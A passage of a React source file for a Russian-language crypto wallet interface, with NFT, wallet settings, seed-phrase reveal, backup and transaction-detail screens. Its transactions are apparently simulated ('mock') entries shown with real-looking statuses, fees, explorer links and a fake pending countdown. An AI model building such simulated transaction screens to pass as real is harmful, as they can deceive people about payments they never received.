                <div style={{ textAlign: "right", minWidth: 0 }}>
                  <div style={{ color: amtColor, fontWeight: 700, fontSize: 16, lineHeight: 1.1 }}>{tx.amount}</div>
                  <div style={{ color: isCancelled ? DS.danger : isPending ? '#FF9F0A' : DS.muted, fontSize: 12, marginTop: 3 }}>
                    {isCancelled ? 'Отменена' : isPending ? 'В процессе' : 'Успешно'}
                  </div>
                </div>
              </div>
              );
            })}
          </div>
        </>
      )}
    </div>
  );
}

/* ─── Screen: Collections ────────────────────────────────────── */
function CollectionsScreen({ onReceive }) {
  return (
    <>
      {/* Header */}
      <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", padding: "16px 20px 8px" }}>
        <div style={{ width: 30 }} />
        <span style={{ color: "white", fontWeight: 600, fontSize: 17 }}>Коллекции</span>
        <button onClick={onReceive} style={{ background: "none", border: "none", cursor: "pointer", padding: 4 }}>
          <svg viewBox="0 0 24 24" fill="none" style={{ width: 22, height: 22 }}>
            <path d="M12 5v14M5 12h14" stroke="white" strokeWidth="2" strokeLinecap="round" />
          </svg>
        </button>
      </div>

      {/* Empty state */}
      <div style={{ flex: 1, display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center", gap: 16, padding: "0 40px" }}>
        <div style={{ width: 80, height: 80, borderRadius: "50%", background: "#252530", display: "flex", alignItems: "center", justifyContent: "center" }}>
          <svg viewBox="0 0 24 24" fill="none" style={{ width: 40, height: 40 }}>
            <rect x="3" y="3" width="7.5" height="7.5" rx="1.5" fill="white" fillOpacity="0.85" />
            <rect x="13.5" y="3" width="7.5" height="7.5" rx="1.5" fill="white" fillOpacity="0.85" />
            <rect x="3" y="13.5" width="7.5" height="7.5" rx="1.5" fill="white" fillOpacity="0.85" />
            <rect x="13.5" y="13.5" width="7.5" height="7.5" rx="1.5" fill="white" fillOpacity="0.85" />
          </svg>
        </div>
        <div style={{ textAlign: "center" }}>
          <div style={{ color: "white", fontWeight: 700, fontSize: 18, marginBottom: 6 }}>Ваши NFT будут здесь</div>
          <div style={{ color: "#888", fontSize: 14 }}>Получите свой первый NFT</div>
        </div>
        <button onClick={onReceive} style={{ background: "#252530", border: "none", borderRadius: 20, color: "white", fontSize: 15, fontWeight: 500, padding: "12px 32px", cursor: "pointer", marginTop: 4 }}>
          Получить
        </button>
      </div>
    </>
  );
}

function ReceiveNFTSelectScreen({ onBack, onSelect }) {
  const [search, setSearch] = useState("");
  const networks = [
    { name: "Ethereum", tokenId: "ETH",      assetId: "eth" },
    { name: "BNB Chain", tokenId: "BNB",     assetId: "bnb" },
    { name: "Solana",    tokenId: "SOL",     assetId: "sol" },
    { name: "TON",       tokenId: "TON",     assetId: "ton" },
  ];

  const filtered = networks.filter(n => n.name.toLowerCase().includes(search.toLowerCase()));

  return (
    <div style={{ display: "flex", flexDirection: "column", flex: 1, background: DS.bg }}>
      <TopBar title="Получить коллекцию" onBack={onBack} />
      
      <div style={{ padding: "0 16px 14px" }}>
        <div style={{ background: "#1C1C1E", borderRadius: 12, display: "flex", alignItems: "center", padding: "10px 14px", gap: 10 }}>
          <svg viewBox="0 0 24 24" fill="none" style={{ width: 20, height: 20, flexShrink: 0 }}>
            <circle cx="11" cy="11" r="8" stroke="#8E8E93" strokeWidth="2" />
            <path d="M21 21l-4.35-4.35" stroke="#8E8E93" strokeWidth="2" strokeLinecap="round" />
          </svg>
          <input value={search} onChange={e => setSearch(e.target.value)} placeholder="Поиск"
            style={{ background: "none", border: "none", outline: "none", color: "white", fontSize: 16, width: "100%" }} />
        </div>
      </div>

      <div style={{ background: "#1C1C1E", borderRadius: 20, margin: "0 16px", overflow: "hidden" }}>
        {filtered.map((net, i) => (
          <div key={net.name}
            onClick={() => onSelect && onSelect(net.assetId)}
            style={{ 
              display: "flex", alignItems: "center", padding: "16px", cursor: "pointer",
              borderBottom: i < filtered.length - 1 ? `1px solid ${DS.border}` : "none"
            }}>
            <div style={{ width: 40, height: 40, flexShrink: 0 }}>
              <TokenIcon tokenId={net.tokenId} size={40} badgeSize={16} />
            </div>
            <span style={{ flex: 1, color: "white", fontSize: 16, marginLeft: 16, fontWeight: 500 }}>{net.name}</span>
            <div style={{ display: "flex", alignItems: "center", gap: 16 }}>
              <button onClick={(e) => { e.stopPropagation(); onSelect && onSelect(net.assetId); }} style={{ background: "none", border: "none", cursor: "pointer", padding: 4 }}>
                <svg viewBox="0 0 24 24" fill="none" style={{ width: 22, height: 22 }}>
                  <rect x="8" y="4" width="12" height="14" rx="2" stroke="white" strokeWidth="1.8" />
                  <path d="M4 8v10a2 2 0 0 0 2 2h10" stroke="white" strokeWidth="1.8" strokeLinecap="round" />
                </svg>
              </button>
              <svg viewBox="0 0 24 24" fill="none" style={{ width: 18, height: 18 }}>
                <path d="M9 18l6-6-6-6" stroke="#8E8E93" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" />
              </svg>
            </div>
          </div>
        ))}
      </div>
    </div>
  );
}

/* ─── Screen: Wallets List ───────────────────────────────────── */
function WalletsScreen({ onBack, onAdd, onSettings }) {
  const { addresses } = useWallet();
  const mainAddr = addresses.ETH || addresses.TON || addresses.SOL || "0x...";
  const shortAddr = mainAddr.slice(0, 6) + "..." + mainAddr.slice(-4);

  const wallets = [
    { id: 1, name: "Кошелек № 1", address: shortAddr }
  ];

  return (
    <div style={{ display: "flex", flexDirection: "column", flex: 1, background: DS.bg }}>
      <TopBar title="Кошельки" onBack={onBack}
        rightEl={
          <button onClick={onAdd} style={{ background: "none", border: "none", cursor: "pointer", padding: 4 }}>
            <svg viewBox="0 0 24 24" fill="none" style={{ width: 24, height: 24 }}>
              <path d="M12 5v14M5 12h14" stroke="white" strokeWidth="2.5" strokeLinecap="round" />
            </svg>
          </button>
        }
      />
      
      <div style={{ padding: "8px 16px" }}>
        <div style={{ background: DS.card, borderRadius: 20, overflow: "hidden", border: `1px solid ${DS.border}` }}>
          {wallets.map((w, i) => (
            <div key={w.id} style={{ display: "flex", alignItems: "center", padding: "16px", cursor: "pointer" }}>
              <div style={{ width: 40, height: 40, borderRadius: "50%", overflow: "hidden", marginRight: 14, boxShadow: "0 0 10px #3B7DFF55" }}>
                <img src={gemIcon} alt="gem" style={{ width: "100%", height: "100%", objectFit: "cover" }} />
              </div>
              <div style={{ flex: 1 }}>
                <div style={{ color: "white", fontWeight: 600, fontSize: 16 }}>{w.name}</div>
                <div style={{ color: DS.muted, fontSize: 13, marginTop: 2 }}>{w.address}</div>
              </div>
              <button onClick={() => onSettings(w)} style={{ background: "none", border: "none", cursor: "pointer", padding: 4 }}>
                <svg viewBox="0 0 24 24" fill="none" style={{ width: 22, height: 22 }}>
                  <circle cx="12" cy="12" r="3" stroke={DS.muted} strokeWidth="2" />
                  <path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1 0 2.83 2 2 0 0 1-2.83 0l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-2 2 2 2 0 0 1-2-2v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83 0 2 2 0 0 1 0-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1-2-2 2 2 0 0 1 2-2h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 0-2.83 2 2 0 0 1 2.83 0l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 2-2 2 2 0 0 1 2 2v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 0 2 2 0 0 1 0 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 2 2 2 2 0 0 1-2 2h-.09a1.65 1.65 0 0 0-1.51 1z" stroke={DS.muted} strokeWidth="2" />
                </svg>
              </button>
            </div>
          ))}
        </div>
      </div>
    </div>
  );
}

/* ─── Screen: Wallet Settings ────────────────────────────────── */
function WalletSettingsScreen({ onBack, wallet }) {
  const { getMnemonic, deleteWallet, updateSetting, settings: walletCtxSettings } = useWallet();
  const [name, setName] = useState(walletCtxSettings?.walletName || wallet?.name || 'Кошелек № 1');
  const [nameSaved, setNameSaved] = useState(false);

  const handleSaveName = () => {
    updateSetting('walletName', name.trim() || 'Кошелек № 1');
    setNameSaved(true);
    setTimeout(() => setNameSaved(false), 2000);
  };

  const [showSeed, setShowSeed] = useState(false);
  const [seedPassword, setSeedPassword] = useState('');
  const [mnemonic, setMnemonic] = useState('');
  const [seedError, setSeedError] = useState('');
  const [confirmDelete, setConfirmDelete] = useState(false);

  const handleShowSeed = async () => {
    setSeedError('');
    try {
      const m = await getMnemonic(seedPassword);
      setMnemonic(m);
    } catch {
      setSeedError('Неверный пароль');
    }
  };

  return (
    <div style={{ display: 'flex', flexDirection: 'column', flex: 1, background: DS.bg }}>
      <TopBar title='Настройки' onBack={onBack} />
      
      <div style={{ padding: '16px' }}>
        <div style={{ background: DS.card, borderRadius: 20, padding: '16px', marginBottom: 16, border: `1px solid ${DS.border}` }}>
          <div style={{ color: DS.muted, fontSize: 13, marginBottom: 10 }}>Имя кошелька</div>
          <input value={name} onChange={e => { setName(e.target.value); setNameSaved(false); }}
            style={{ width: '100%', background: DS.input, border: `1px solid ${DS.border}`, borderRadius: 12,
              outline: 'none', color: 'white', fontSize: 16, fontWeight: 500, padding: '11px 14px',
              boxSizing: 'border-box', marginBottom: 10 }} />
          <button onClick={handleSaveName}
            style={{ width: '100%', padding: '12px', borderRadius: 12, background: nameSaved ? DS.green : DS.blue,
              color: 'white', border: 'none', fontSize: 15, fontWeight: 600, cursor: 'pointer',
              transition: 'background 0.2s' }}>
            {nameSaved ? '✓ Сохранено' : 'Сохранить'}
          </button>
        </div>

        <div style={{ background: DS.card, borderRadius: 20, overflow: 'hidden', border: `1px solid ${DS.border}`, marginBottom: 16 }}>
          <div onClick={() => { setShowSeed(s => !s); setMnemonic(''); setSeedPassword(''); setSeedError(''); }}
            style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '16px',
              borderBottom: showSeed ? `1px solid ${DS.border}` : 'none', cursor: 'pointer' }}>
            <span style={{ color: 'white', fontSize: 16 }}>Показать секретную фразу</span>
            <ChevronRight />
          </div>
          {showSeed && !mnemonic && (
            <div style={{ padding: '12px 16px' }}>
              <p style={{ color: DS.warn, fontSize: 13, marginBottom: 10, marginTop: 0 }}>⚠️ Никому не показывайте секретную фразу</p>
              <input type='password' placeholder='Введите пароль' value={seedPassword}
                onChange={e => setSeedPassword(e.target.value)}
                style={{ width: '100%', padding: '12px 14px', background: DS.input, border: `1px solid ${DS.border}`,
                  borderRadius: 10, color: '#fff', fontSize: 15, outline: 'none', boxSizing: 'border-box' }} />
              {seedError && <div style={{ color: DS.danger, fontSize: 13, marginTop: 6 }}>{seedError}</div>}
              <button onClick={handleShowSeed}
                style={{ width: '100%', marginTop: 10, padding: '12px', borderRadius: 10, background: DS.blue,
                  color: 'white', border: 'none', fontSize: 15, fontWeight: 600, cursor: 'pointer' }}>
                Показать
              </button>
            </div>
          )}
          {mnemonic && (
            <div style={{ padding: '12px 16px' }}>
              <div style={{ display: 'flex', flexWrap: 'wrap', gap: 8, marginBottom: 12 }}>
                {mnemonic.split(' ').map((word, i) => (
                  <div key={i} style={{ background: DS.input, borderRadius: 8, padding: '6px 12px', display: 'flex', gap: 6 }}>
                    <span style={{ color: DS.muted, fontSize: 12 }}>{i + 1}</span>
                    <span style={{ color: 'white', fontSize: 13 }}>{word}</span>
                  </div>
                ))}
              </div>
              <button onClick={() => { setMnemonic(''); setSeedPassword(''); }}
                style={{ width: '100%', padding: '12px', borderRadius: 10, background: DS.input,
                  color: 'white', border: 'none', fontSize: 15, cursor: 'pointer' }}>
                Скрыть
              </button>
            </div>
          )}
        </div>

        <div style={{ background: 'rgba(255,69,58,0.12)', borderRadius: 20, overflow: 'hidden',
          border: '1px solid rgba(255,69,58,0.35)' }}>
          {!confirmDelete ? (
            <div onClick={() => setConfirmDelete(true)}
              style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '16px', cursor: 'pointer' }}>
              <span style={{ color: DS.danger, fontSize: 16 }}>Удалить кошелек</span>
              <ChevronRight color={DS.danger} />
            </div>
          ) : (
            <div style={{ padding: '16px' }}>
              <p style={{ color: DS.danger, fontSize: 13, marginTop: 0, marginBottom: 12 }}>
                ❗ Удаление необратимо. Убедитесь, что у вас есть секретная фраза!
              </p>
              <div style={{ display: 'flex', gap: 8 }}>
                <button onClick={() => deleteWallet()}
                  style={{ flex: 1, padding: '12px', borderRadius: 10, background: '#FF3B30',
                    color: 'white', border: 'none', fontSize: 15, fontWeight: 600, cursor: 'pointer' }}>
                  Удалить
                </button>
                <button onClick={() => setConfirmDelete(false)}
                  style={{ flex: 1, padding: '12px', borderRadius: 10, background: DS.input,
                    color: 'white', border: 'none', fontSize: 15, cursor: 'pointer' }}>
                  Отмена
                </button>
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}

/* ─── Screen: Wallet Add Options ─────────────────────────────── */
function WalletAddScreen({ onBack, onCreate, onImport, onShowMenu }) {
  const options = [
    { id: "create", label: "Создать новый кошелек", sub: "Создайте новый кошелек и начните работу", icon: "✨", action: onCreate },
    { id: "import", label: "У меня уже есть кошелек", sub: "Импортируйте кошелек с помощью секретной фразы", icon: "🔑", action: onImport },
    { id: "google", label: "Google Drive", sub: "Восстановите кошелек из резервной копии Google", icon: "📁", action: onShowMenu },
    { id: "icloud", label: "iCloud", sub: "Восстановите кошелек из резервной копии iCloud", icon: "☁️", action: onShowMenu },
  ];

  return (
    <div style={{ display: "flex", flexDirection: "column", flex: 1, background: DS.bg }}>
      <TopBar title="Добавить кошелек" onBack={onBack} />
      
      <div style={{ padding: "16px", display: "flex", flexDirection: "column", gap: 12 }}>
        {options.map((opt) => (
          <div key={opt.id} onClick={opt.action}
            style={{ background: DS.card, borderRadius: 20, padding: "16px", display: "flex", alignItems: "center", gap: 16, cursor: "pointer", border: `1px solid ${DS.border}` }}>
            <div style={{ width: 48, height: 48, borderRadius: 12, background: "#252528", display: "flex", alignItems: "center", justifyContent: "center", fontSize: 24 }}>
              {opt.icon}
            </div>
            <div style={{ flex: 1 }}>
              <div style={{ color: "white", fontWeight: 600, fontSize: 16 }}>{opt.label}</div>
              <div style={{ color: DS.muted, fontSize: 13, marginTop: 4 }}>{opt.sub}</div>
            </div>
            <ChevronRight />
          </div>
        ))}
      </div>
    </div>
  );
}

/* ─── Screen: Wallet Backup Menu (The "same menu" from screenshots) ─── */
function WalletBackupMenu({ onBack, onOption }) {
  const options = [
    { id: "gdrive", label: "Google Drive", icon: "📁" },
    { id: "icloud", label: "iCloud", icon: "☁️" },
    { id: "manual", label: "Вручную", icon: "✍️" },
  ];

  return (
    <div style={{ display: "flex", flexDirection: "column", flex: 1, background: DS.bg }}>
      <TopBar title="Резервная копия" onBack={onBack} />
      
      <div style={{ padding: "16px", display: "flex", flexDirection: "column", gap: 12 }}>
        <div style={{ textAlign: "center", padding: "20px 0" }}>
          <div style={{ fontSize: 48, marginBottom: 16 }}>🛡️</div>
          <div style={{ color: "white", fontWeight: 700, fontSize: 20, marginBottom: 8 }}>Защитите свой кошелек</div>
          <div style={{ color: DS.muted, fontSize: 14, lineHeight: 1.5 }}>
            Выберите способ создания резервной копии вашего кошелька для обеспечения безопасности ваших средств.
          </div>
        </div>

        <div style={{ background: DS.card, borderRadius: 20, overflow: "hidden", border: `1px solid ${DS.border}` }}>
          {options.map((opt, i) => (
            <div key={opt.id} onClick={() => onOption(opt.id)}
              style={{ display: "flex", alignItems: "center", padding: "16px", cursor: "pointer", borderBottom: i < options.length - 1 ? `1px solid ${DS.border}` : "none" }}>
              <div style={{ fontSize: 24, marginRight: 16 }}>{opt.icon}</div>
              <span style={{ flex: 1, color: "white", fontSize: 16, fontWeight: 500 }}>{opt.label}</span>
              <ChevronRight />
            </div>
          ))}
        </div>
      </div>
    </div>
  );
}

/* ─── Address row with explorer arrow ───────────────────────── */
function AddressRow({ label, address, assetId }) {
  const addrShort = shortAddress(address);
  const explorerUrl = assetId ? getExplorerAddressUrl(assetId, address) : null;
  const handleOpen = () => {
    if (!explorerUrl) return;
    openInApp(explorerUrl);
  };
  const isClickable = !!explorerUrl;
  return (
    <div
      onClick={isClickable ? handleOpen : undefined}
      style={{ display: "flex", alignItems: "center", justifyContent: "space-between", padding: "16px", borderBottom: `1px solid ${DS.border}`, cursor: isClickable ? "pointer" : "default" }}>
      <span style={{ color: "white", fontSize: 15, fontWeight: 500, flexShrink: 0 }}>{label}</span>
      <div style={{ display: "flex", alignItems: "center", gap: 6, minWidth: 0 }}>
        <span style={{ color: DS.muted, fontSize: 14, fontWeight: 500, fontFamily: "monospace", letterSpacing: "0.03em", overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" }}>
          {addrShort}
        </span>
        {isClickable && (
          <svg viewBox="0 0 24 24" fill="none" style={{ width: 16, height: 16, flexShrink: 0 }}>
            <path d="M9 18l6-6-6-6" stroke={DS.muted} strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
          </svg>
        )}
      </div>
    </div>
  );
}

/* ─── Screen: Activity ───────────────────────────────────────── */
function TxDetailScreen({ tx, onBack }) {
  const { cancelMockTransaction, resolvePendingTransaction } = useWallet();
  const [localStatus, setLocalStatus] = useState(tx.status);
  const [timeLeft, setTimeLeft] = useState(null);

  useEffect(() => {
    if (localStatus !== 'В процессе' || !tx.pendingUntil) return;
    const update = () => {
      const rem = Math.max(0, tx.pendingUntil - Date.now());
      setTimeLeft(rem);
      if (rem === 0) {
        resolvePendingTransaction(tx.id);
        setLocalStatus('Успешный');
      }
    };
    update();
    const iv = setInterval(update, 1000);
    return () => clearInterval(iv);
  }, [localStatus, tx.pendingUntil, tx.id, resolvePendingTransaction]);

  const fmtTimeLeft = (ms) => {
    if (ms <= 0) return '0:00';
    const m = Math.floor(ms / 60000);
    const s = Math.floor((ms % 60000) / 1000);
    return `${m}:${s.toString().padStart(2, '0')}`;
  };

  const handleCancel = () => {
    cancelMockTransaction(tx.id);
    setLocalStatus('Отменена');
  };

  const ShareIcon = () => (
    <svg viewBox="0 0 24 24" fill="none" style={{ width: 22, height: 22 }}>
      <path d="M4 12v7a1 1 0 0 0 1 1h14a1 1 0 0 0 1-1v-7" stroke="white" strokeWidth="2" strokeLinecap="round" />
      <path d="M12 3v12M8 7l4-4 4 4" stroke="white" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
    </svg>
  );

  const InfoIcon = () => (
    <div style={{ width: 16, height: 16, borderRadius: "50%", border: `1.5px solid ${DS.muted}`,
      display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0 }}>
      <span style={{ color: DS.muted, fontSize: 10, fontWeight: 700 }}>i</span>
    </div>
  );

  const Row = ({ label, value, valueColor, extra, arrow }) => (
    <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", padding: "16px",
      borderBottom: `1px solid ${DS.border}` }}>
      <div style={{ display: "flex", alignItems: "center", gap: 6 }}>
        <span style={{ color: "white", fontSize: 15, fontWeight: 500 }}>{label}</span>
        {extra}
      </div>
      <div style={{ display: "flex", alignItems: "center", gap: 6 }}>
        <span style={{ color: valueColor || DS.muted, fontSize: 15, fontWeight: 500 }}>{value}</span>
        {arrow && <ChevronRight />}
      </div>
    </div>
  );

  const asset = BASE_ASSETS.find(a => a.id === tx.assetId);
  const dateStr = tx.timestamp ? new Date(tx.timestamp).toLocaleString("ru-RU", { day: 'numeric', month: 'long', hour: '2-digit', minute: '2-digit' }) : "Недавно";

  return (
    <div style={{ display: "flex", flexDirection: "column", flex: 1, background: DS.bg, overflowY: "auto", paddingBottom: 90 }}>
      <div style={{ display: "flex", alignItems: "center", padding: "16px 20px", gap: 12 }}>
        <button onClick={onBack} style={{ background: "none", border: "none", cursor: "pointer", padding: 4 }}>
          <svg viewBox="0 0 24 24" fill="none" style={{ width: 24, height: 24 }}>
            <path d="M15 19l-7-7 7-7" stroke="white" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" />
          </svg>
        </button>
        <span style={{ flex: 1, color: "white", fontWeight: 700, fontSize: 18, textAlign: "center" }}>{tx.type}</span>
        <button style={{ background: "none", border: "none", cursor: "pointer", padding: 4 }}><ShareIcon /></button>
      </div>

      <div style={{ display: "flex", flexDirection: "column", alignItems: "center", padding: "20px 0 32px" }}>
        <div style={{ width: 80, height: 80, borderRadius: "50%", overflow: "hidden", background: DS.input, display: "flex", alignItems: "center", justifyContent: "center" }}>
          {asset ? (
            <div style={{width: 54, height: 54}}>
              <TokenIcon tokenId={asset.tokenId} size={54} badgeSize={20} />
            </div>
          ) : (
            <TokenIcon tokenId={tx.tokenId} size={54} badgeSize={20} />
          )}
        </div>
        <div style={{ marginTop: 20, textAlign: "center", padding: "0 16px" }}>
          <div style={{ color: "white", fontSize: 36, fontWeight: 700, letterSpacing: -1 }}>{tx.amount}</div>
          <div style={{ color: "white", fontSize: 18, fontWeight: 600, opacity: 0.7, marginTop: 2 }}>{tx.symbol || ''}</div>
        </div>
        <div style={{ color: DS.muted, fontSize: 15, marginTop: 6, fontWeight: 500 }}>~ {tx.usdValue || "0,00"} $</div>
      </div>

      <div style={{ background: DS.card, borderRadius: 20, margin: "0 16px 12px", overflow: "hidden", border: `1px solid ${DS.border}` }}>
        <Row label="Дата" value={dateStr} />
        <Row label="Статус" value={localStatus || "Успешный"}
            valueColor={localStatus === 'Ошибка' ? DS.danger : localStatus === 'В процессе' ? '#FF9F0A' : localStatus === 'Отменена' ? DS.muted : DS.green}
            extra={<InfoIcon />} />
        <AddressRow
          label={tx.type === "Получено" ? "Отправитель" : "Получатель"}
          address={(tx.type === "Получено" ? tx.from : tx.to) || "—"}
          assetId={tx.assetId}
        />
        <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", padding: "16px" }}>
          <span style={{ color: "white", fontSize: 15, fontWeight: 500 }}>Сеть</span>
          <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
            <span style={{ color: DS.muted, fontSize: 15, fontWeight: 500 }}>{asset ? asset.name : "—"}</span>
            {asset && (
              <div style={{ width: 24, height: 24, borderRadius: "50%", overflow: "hidden" }}>
                <TokenIcon tokenId={asset.tokenId} size={24} badgeSize={10} />
              </div>
            )}
          </div>
        </div>
      </div>

      <div style={{ background: DS.card, borderRadius: 20, margin: "0 16px 12px", border: `1px solid ${DS.border}` }}>
        <div onClick={() => { const u = getExplorerTxUrl(tx.assetId, tx.hash); if (u) openInApp(u); }}
          style={{ display: "flex", alignItems: "center", justifyContent: "space-between", padding: "16px", cursor: tx.hash ? "pointer" : "default" }}>
          <div style={{ display: "flex", alignItems: "center", gap: 6 }}>
            <span style={{ color: "white", fontSize: 15, fontWeight: 500 }}>Сетевая плата</span>
            <div style={{ width: 18, height: 18, borderRadius: "50%", border: "1.5px solid #555", display: "flex", alignItems: "center", justifyContent: "center", color: "#555", fontSize: 12, fontWeight: 700 }}>i</div>
          </div>
          <div style={{ display: "flex", alignItems: "center", gap: 4 }}>
            <span style={{ color: DS.muted, fontSize: 15, fontWeight: 500 }}>{formatTxFee(tx.fee, tx.assetId) || "0,001 " + (asset?.symbol || "")}</span>
            {tx.hash && <svg viewBox="0 0 24 24" fill="none" style={{ width: 16, height: 16, flexShrink: 0 }}><path d="M9 18l6-6-6-6" stroke={DS.muted} strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" /></svg>}
          </div>
        </div>
      </div>

      <div style={{ background: DS.card, borderRadius: 20, margin: "0 16px", border: `1px solid ${DS.border}` }}>
        <div onClick={() => { const u = getExplorerTxUrl(tx.assetId, tx.hash); if (u) openInApp(u); }}
          style={{ display: "flex", alignItems: "center", justifyContent: "space-between", padding: "16px", cursor: "pointer" }}>
          <span style={{ color: "white", fontSize: 15, fontWeight: 500 }}>Посмотреть в эксплорере</span>
          <ChevronRight />
        </div>
      </div>

      <div style={{ padding: "16px", marginTop: 8 }}>
          {localStatus === "В процессе" && tx.pendingUntil && (
            <div style={{ marginBottom: 12 }}>
              <div style={{ background: "rgba(255,159,10,0.10)", border: "1px solid rgba(255,159,10,0.30)", borderRadius: 18, padding: "16px 18px", display: "flex", flexDirection: "column", gap: 10 }}>
                <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between" }}>
                  <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
                    <div style={{ width: 9, height: 9, borderRadius: "50%", background: "#FF9F0A", animation: "pulse 1.2s infinite" }} />
                    <span style={{ color: "white", fontWeight: 700, fontSize: 15 }}>В процессе</span>
                  </div>
                  {timeLeft !== null && (
                    <div style={{ display: "flex", alignItems: "center", gap: 5, background: "rgba(255,159,10,0.18)", borderRadius: 10, padding: "4px 10px" }}>
                      <svg viewBox="0 0 24 24" fill="none" style={{ width: 13, height: 13 }}>
                        <circle cx="12" cy="12" r="9" stroke="#FF9F0A" strokeWidth="2" />
                        <path d="M12 7v5l3 3" stroke="#FF9F0A" strokeWidth="2" strokeLinecap="round" />
                      </svg>
                      <span style={{ color: "#FF9F0A", fontWeight: 700, fontSize: 14, fontVariantNumeric: "tabular-nums" }}>{fmtTimeLeft(timeLeft)}</span>
                    </div>
                  )}
                </div>
                <div style={{ color: "#CC8800", fontSize: 13, lineHeight: 1.5 }}>
                  Транзакция ожидает подтверждения. Низкая комиссия — майнеры обрабатывают медленно.
                </div>
              </div>
            </div>
          )}
          {localStatus === "В процессе" && tx.pendingUntil && (
            <button onClick={handleCancel}
              style={{ width: "100%", padding: "16px 0", borderRadius: 14, border: "1px solid rgba(255,69,58,0.35)",
                background: "rgba(255,69,58,0.10)", color: "#FF453A", fontSize: 16, fontWeight: 700, cursor: "pointer",
                display: "flex", alignItems: "center", justifyContent: "center", gap: 10,
                fontFamily: DS.font, transition: "all 0.2s" }}>
              <svg viewBox="0 0 24 24" fill="none" style={{ width: 18, height: 18 }}>
                <circle cx="12" cy="12" r="9" stroke="#FF453A" strokeWidth="2" />
                <path d="M15 9l-6 6M9 9l6 6" stroke="#FF453A" strokeWidth="2" strokeLinecap="round" />
              </svg>
              Отменить транзакцию
            </button>
          )}
          {localStatus === "Отменена" && (
            <div style={{ background: "rgba(142,142,147,0.12)", border: "1px solid rgba(142,142,147,0.2)", borderRadius: 16, padding: "14px 18px", textAlign: "center" }}>
              <div style={{ color: DS.muted, fontWeight: 600, fontSize: 14 }}>Транзакция отменена</div>
              <div style={{ color: DS.muted, fontSize: 13, marginTop: 4 }}>Средства возвращены на баланс</div>
            </div>
          )}
        </div>
    </div>
  );
}


  /* ─── Pending timer badge for activity list ─────────────────── */
  function PendingActivityTimer({ pendingUntil }) {
    const [timeLeft, setTimeLeft] = useState(() => Math.max(0, pendingUntil - Date.now()));
    useEffect(() => {
      if (!pendingUntil) return;
      const iv = setInterval(() => {
        const rem = Math.max(0, pendingUntil - Date.now());
        setTimeLeft(rem);
        if (rem === 0) clearInterval(iv);
      }, 1000);
      return () => clearInterval(iv);
    }, [pendingUntil]);
    const m = Math.floor(timeLeft / 60000);
    const s = Math.floor((timeLeft % 60000) / 1000);
    const str = `${m}:${s.toString().padStart(2, '0')}`;
    return (
      <div style={{ display: "flex", alignItems: "center", gap: 3 }}>
        <svg viewBox="0 0 24 24" fill="none" style={{ width: 11, height: 11 }}>
          <circle cx="12" cy="12" r="9" stroke="#FF9F0A" strokeWidth="2.2" />
          <path d="M12 7v5l3 3" stroke="#FF9F0A" strokeWidth="2.2" strokeLinecap="round" />
        </svg>
        <span style={{ color: "#FF9F0A", fontSize: 11, fontWeight: 700, fontVariantNumeric: "tabular-nums" }}>{str}</span>
      </div>
    );
  }
  
const ActivityScreen = memo(({ activeTab, setActiveTab }) => {
  const { mockTransactions } = useWallet();
  const [selectedTx, setSelectedTx] = useState(null);

  const _livePriceMapAct = useLivePriceMap();
  const getActPrice = (id) => {
    if (!id) return 0;
    if (id.startsWith('usdt')) return 1.00;
    const live = _livePriceMapAct[id];
    if (live) return live.usdPrice;
    const base = BASE_ASSETS.find(a => a.id === id);
    return base?.usdPrice || 0;
  };

  const allTx = (mockTransactions || []).map(tx => {
    const asset = BASE_ASSETS.find(a => a.id === tx.assetId);
    const shortTo = tx.to ? (tx.to.slice(0,4)+"..."+tx.to.slice(-4)) : "—";
    const shortFrom = tx.from ? (tx.from.slice(0,4)+"..."+tx.from.slice(-4)) : "—";
    const sign = tx.type === 'Отправлено' ? '-' : '+';
    const symbol = asset ? asset.symbol : '';
    return {
      id: tx.id,
      hash: tx.hash,
      type: tx.type,
      fee: tx.fee,
      timestamp: tx.timestamp,
      tokenId: asset ? asset.tokenId : 'TON',
      amount: `${sign}${fmtCryptoAmt(tx.amount)}`,
      symbol,
      rawAmount: parseFloat(tx.amount),
      sub: tx.type === 'Отправлено' ? `Кому ${shortTo}` : `От ${shortFrom}`,
      positive: tx.type !== 'Отправлено',
      isMock: true,
      assetId: tx.assetId,
      status: tx.status || 'Успешный',
      from: tx.from || null,
      to: tx.to || null,
      usdValue: (parseFloat(tx.amount) * getActPrice(tx.assetId)).toFixed(2).replace(".", ","),
      pendingUntil: tx.pendingUntil || null,
    };
  });

  if (selectedTx) {
    return <TxDetailScreen tx={selectedTx} onBack={() => setSelectedTx(null)} />;
  }

  return (
    <>
      <div style={{ display: "flex", alignItems: "center", justifyContent: "center", padding: "16px 20px 8px" }}>
        <span style={{ color: "white", fontWeight: 700, fontSize: 20 }}>Активность</span>
